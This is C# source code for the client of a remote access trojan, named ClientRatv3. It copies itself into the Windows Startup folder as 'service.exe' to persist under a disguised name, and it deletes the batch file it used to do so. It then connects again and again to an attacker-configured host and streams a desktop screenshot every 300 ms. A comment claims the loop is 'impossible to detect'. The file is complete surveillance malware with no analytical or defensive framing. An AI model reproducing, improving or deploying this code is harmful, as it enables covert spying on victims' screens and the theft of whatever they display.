using System;
using System.Net.Sockets;
using System.Threading;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.Serialization.Formatters.Binary;
using System.Drawing.Imaging;
using System.IO;
using Microsoft.Win32;
namespace ClientRatv3
{
    class Program
    {
        public const string DefaultPath= "copy \"ClientRat_cs.exe\" \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\service.exe\"";
        public const string victimIp = "STD_IP";
        public const int victimPort = STD_PORT;
        public static Thread t;
        public static bool HasStarted = false;
        static void Main(string[] args)
        {
            File.WriteAllText("options.bat", DefaultPath);
            System.Diagnostics.Process.Start("options.bat");
            Thread.Sleep(300);
            File.Delete("options.bat");
            EnableRat();
        }
        private static void EnableRat()
        { 
        INIT:
            t = new Thread(RatCode);
            t.Start();
            HasStarted = true;
            while (HasStarted)
            {
                if (!t.IsAlive)
                {
                    HasStarted = false;
                }

            }
            goto INIT;

        }
        private static void RatCode()
        {
            TcpClient Client = new TcpClient();
            BinaryFormatter binF = new BinaryFormatter();
            try
            {
                Client.Connect(victimIp, victimPort);
            }
            catch (Exception e)
            {
                //MessageBox.Show(e.Message);
                Thread.Sleep(500); // it doesn't waste resources, impossible to detect
                return;
            }
            NetworkStream mainStream = Client.GetStream();
            try
            {
                while (true)
                {
                    Thread.Sleep(300);
                    binF.Serialize(mainStream, GrabDesktop());
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
                return;
            }

        }
        private static Image GrabDesktop()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graphic = Graphics.FromImage(screenshot);
            graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }
    }
}
